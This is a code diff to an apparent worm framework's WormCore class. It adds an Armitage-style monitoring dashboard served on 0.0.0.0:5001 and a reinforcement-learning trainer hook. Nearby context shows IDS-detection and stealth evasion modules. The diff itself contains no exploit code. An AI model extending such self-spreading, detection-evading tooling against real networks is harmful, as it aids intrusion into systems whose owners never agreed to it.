@@ -302,6 +302,26 @@ class WormCore:
         except Exception as e:
             logger.warning(f"Web Dashboard failed to initialize: {e}")
 
+        # Armitage-Style Dashboard
+        self.armitage_dashboard = None
+        try:
+            from monitoring.armitage_dashboard import ArmitageDashboard
+            from training.realistic_training import RealisticTrainer
+            trainer = None
+            try:
+                trainer = RealisticTrainer(self.config.ml.rl_agent_path.replace('.h5', ''))
+            except Exception:
+                pass
+            self.armitage_dashboard = ArmitageDashboard(
+                worm_core=self,
+                trainer=trainer,
+                host='0.0.0.0',
+                port=5001
+            )
+            logger.info("Armitage Dashboard: enabled (http://0.0.0.0:5001)")
+        except Exception as e:
+            logger.warning(f"Armitage Dashboard failed to initialize: {e}")
+
         # Evasion modules
         from evasion.ids_detector import IDSDetector
         from evasion.stealth_engine import StealthEngine
@@ -1128,6 +1148,14 @@ class WormCore:
                 logger.info("Web Dashboard started at http://0.0.0.0:5000")
             except Exception as e:
                 logger.warning(f"Failed to start Web Dashboard: {e}")
+
+        # Start Armitage Dashboard in background
+        if self.armitage_dashboard:
+            try:
+                self.armitage_dashboard.run_background()
+                logger.info("Armitage Dashboard started at http://0.0.0.0:5001")
+            except Exception as e:
+                logger.warning(f"Failed to start Armitage Dashboard: {e}")
 
         iteration = 0
         online_learning_interval = 10
